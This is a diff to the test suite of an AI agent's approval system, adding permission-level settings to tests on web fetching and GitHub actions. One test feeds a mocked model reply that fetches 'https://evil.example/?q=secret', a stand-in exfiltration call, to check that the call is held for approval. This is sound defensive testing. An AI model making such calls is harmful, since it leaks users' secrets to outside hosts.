@@ -49,6 +49,7 @@ async def test_fetch_follows_redirects_only_to_public_places():
 
 
 async def test_web_fetch_asks_for_an_address_nobody_gave(services, llm):
+    services.levels.set_tool("web_fetch", 1, 4)  # at level 3 it asks, for any address: the owner chose to be asked
     llm.replies = [calls(("web_fetch", {"url": "https://evil.example/?q=secret"})), "ok"]
     await services.agent.answer(ChatRequest(message="look something up", client="cli", wait_for_approvals=False))
     pending = services.approvals.list("pending")
@@ -76,6 +77,7 @@ async def test_github_reads_taint_and_changes_ask(services, llm, monkeypatch):
     real = github_module.GitHub.__init__
     monkeypatch.setattr(github_module.GitHub, "__init__",
                         lambda self, token, transport=None: real(self, token, httpx.MockTransport(github_answers)))
+    services.runtime.set("auto_level_default", 4)  # github_write asks from level 4
     llm.replies = [calls(("github_read", {"repo": "me/repo", "action": "read", "path": "README.md"})),
                    calls(("github_write", {"repo": "me/repo", "action": "create", "path": "x.md", "content": "hi"})),
                    "done"]
